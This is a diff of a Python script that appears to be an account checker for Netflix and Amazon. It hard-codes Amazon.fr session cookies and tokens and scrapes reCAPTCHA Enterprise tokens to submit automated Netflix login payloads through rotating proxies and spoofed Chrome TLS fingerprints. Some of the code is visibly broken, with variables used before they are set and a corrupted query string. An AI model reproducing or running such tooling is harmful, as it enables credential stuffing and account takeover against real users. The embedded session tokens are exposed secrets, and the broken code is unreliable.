@@ -119,7 +119,8 @@ amazon_headers = {
         'accept-language': 'fr,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
         'content-type': 'application/x-www-form-urlencoded',
-        'cookie': 'signin-sso-state-fr=9a588507-c1d0-47d2-9b4e-24660962a172; session-id=259-0765909-8490911; ubid-acbfr=257-0984503-1653536; s_cc=true; s_nr=1628038460339-New; s_vnum=2060038460339%26vn%3D1; s_dslv=1628038460342; s_sq=%5B%5BB%5D%5D; s_ppv=28; lc-acbfr=fr_FR; sst-acbfr=Sst1|PQF8-IR2JwMpPCYbuYCWXsn0CUByhtpw3G-ru2dOH1cCAwob0wV9_PHM53N5vhYwOh_10q-TmrnyJiDIubhN1vQRwdPX6zr81XepEK4gwVCPuknVsOTraJuLC0KTDLWGpSH1zA7fOq5sI8sp8fDRlnH1nLMf1LgfkKNoSMXBG-bfJLJhyF5VfnhJ_ARRFXOqeEDXqYsSFjZOevjChkRdY4s7xdFORfxpv-R00B-KXv6bpxR5aMOjnQqHGWrJlldWQaAaFYqSpQ-DsuQfb4D5C1_Mrnc7AKc8KU9WPCsuxnvlu1w; i18n-prefs=EUR; session-token="79xix76gKPVVnFiaW9dcHSh+Um4/4J7yi5BR0BAjliXf2Cun5JLeD2BpFKgO1kZsu6ialy8NtAj9qauNFQgn7fHycrZVdsrloQ80RCMZAHbt/T1mWOxDYofcMLA46ZrcaBo1ad7d4dhlfpsZpeEYXjY6OrkE2oZJXv8GCZ3b64qVcmNDT6GuNEdiQSApa9f1CWCU/DwpfDeFd96cXaZltct5FJuJJ1PCv5++TQHAXogh56Hp4H6dkOetF2AAXHzc2cHoMDZFvQ0="; session-id-time=2259697171l; csm-hit=tb:CCFXXEQY6J81PR2CX5JM+b-1QVH157HS0JKGH9N9B30|1628977179563&t:1628977179563&adb:adblk_yes',
+        'cookie': 'signin-sso-state-fr=9a588507-c1d0-47d2-9b4e-24660962a172; session-id=259-0765909-8490911; ubid-acbfr=257-0984503-1653536; s_cc=true; s_nr=1628038460339-New; s_vnum=2060038460339%26vn%3D1; s_dslv=1628038460342; s_sq=%5B%5BB%5D%5D; s_ppv=28; lc-acbfr=fr_FR; sst-acbfr=Sst1|PQF8-IR2JwMpPCYbuYCWXsn0CUByhtpw3G-ru2dOH1cCAwob0wV9_PHM53N5vhYwOh_10q-TmrnyJiDIubhN1vQRwdPX6zr81XepEK4gwVCPuknVsOTraJuLC0KTDLWGpSH1zA7fOq5sI8sp8fDRlnH1nLMf1LgfkKNoSMXBG-bfJLJhyF5VfnhJ_ARRFXOqeEDXqYsSFjZOevjChkRdY4s7xdFORfxpv-R00B-KXv6bpxR5aMOjnQqHGWrJlldWQaAaFYqSpQ-DsuQfb4D5C1_Mrnc7AKc8KU9WPCsuxnvlu1w; i18n-prefs=EUR; session-token="79xix76gKPVVnFiaW9dcHSh+Um4/4J7yi5BR0BAjliXf2Cun5JLeD2BpFKgO1kZsu6ialy8NtAj9qauNFQgn7fHycrZVdsrloQ80RCMZAHbt/T1mWOxDYofcMLA46ZrcaBo1ad7d4dhlfpsZpeEYXjY6OrkE2oZJXv8GCZ3b64qVcmNDT6GuNEdiQSApa9f1CWCU/DwpfDeFd96cXaZltct5FJuJJ1PCv5++TQHAXogh56Hp4H6dkOetF2AAXHzc2cHoMDZFvQ0="; session-id-time=2259697171l; csm-hit=tb:CCFXXEQY6J81PR2CX5JM+b-1QVH157HS0JKGH9N9B30|1628977179563&t:1628977179563&adb:adblk_yes', 
+
         'downlink': '10',
         'ect': '4g',
         'origin': 'https://www.amazon.fr',
@@ -490,24 +491,38 @@ _〢 {r}% {"◽️" * int(r/10)}{"◼️" * int(10 - r/10)}_"""
             country='FR'
 
         r = requests.get('https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=fr&v=MuIyr8Ej74CrXhJDQy37RPBe&size=invisible&cb=y0gagce4qyp4')
-        
+        sess = Session(client_identifier='chrome112', random_tls_extension_order=True)
         soup = bs4.BeautifulSoup(r.text, 'html.parser')
         # print(r.text)
         basic_token = soup.find('input', {'id': 'recaptcha-token'})['value']
-
+        r = sess.get('https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR&231co=aHR0cHM6Lys93d3cubmV0ZmxpeC5jb206NDQz&hl=fr&v=SglpK98hSCn2CroR0bKRSJl5&size=invisible&cb=d7akj8zgc35z')
         resp = requests.post(
             'https://www.google.com/recaptcha/enterprise/reload?k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR',
             headers={'Content-Type': 'application/x-www-form-urlencoded'},
             data=f'reason=q&c={basic_token}'
         )
-
-        content = resp.text[4:]
-        recaptcha = json.loads(content)[1]
-
-
-        sess = Session(client_identifier='chrome112', random_tls_extension_order=True)
+        grospaylaod = '{"action":"loginAction","fields":{"nextPage":"","rememberMe":"true","countryCode":"COCO","countryIsoCode":"ISSSO","userLoginId":"MAMALENUM","password":"PAPASOWRD","recaptchaResponseToken":"CACAPTCH","recaptchaResponseTime":"226","previousMode":""}}'
+        grospaylaod = grospaylaod.replace("CACAPTCH", recaptcha)
 
         
+        data = {
+                'param': grospaylaod,
+                'allocations[55252]': '2',
+                'allocations[58371]': '10',
+                'esn': 'NFCDCH-02-KN9Y8H5RXPAEXAV5Y04L3MMPAL8Y5N',
+                'authURL': authurl,
+            }
+        recv = r.text
+     #   content = resp.text[4:]
+        recaptcha = json.loads(resp.text[4:])[1]
+
+        authurl = urllib.parse.unquote(r.text.split('authURL":"')[1].split('"')[0].replace("\\x", "%"))
+        sess = Session(client_identifier='chrome112', random_tls_extension_order=True)
+
+        print(f"R pour num: {recv}")
+        rcjson = r.json()       
+        numstatus = rcjson['jsonGraph']['aui']['moneyball']['next']['value']['result']['fields']['errorCode']['value']
+        print(numstatus)
         global cprox
         prox = chk.proxs[cprox]
         cprox += 1
@@ -604,7 +619,7 @@ _〢 {r}% {"◽️" * int(r/10)}{"◼️" * int(10 - r/10)}_"""
         #         f.write(r.content)
 
         return p
-
+    
     
     # @staticmethod
     # def netflix(info: str) -> bool:
@@ -753,7 +768,7 @@ def test_netflix(num, prox):
     optanon = f"isGpcEnabled=0&datestamp={date}%2B0200+(heure+d%E2%80%99%C3%A9t%C3%A9+d%E2%80%99Europe+centrale)&version=202301.1.0&isIABGlobal=false&hosts=&consentId={consent_id}&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&geolocation=FR%3BPAC&AwaitingReconsent=false"
 
     cookies = f"""OptanonAlertBoxClosed=2023-05-30T23:24:29.526Z; hasSeenCookieDisclosure=true; dsca=anonymous; flwssn={scookies['flwssn']}; nfvdid={scookies['nfvdid']}; SecureNetflixId={scookies['SecureNetflixId']}; NetflixId={scookies['NetflixId']}; OptanonConsent={optanon}"""
-
+   
     headers = {
         "Cookie": cookies, 
         "Content-Type": "application/x-www-form-urlencoded"
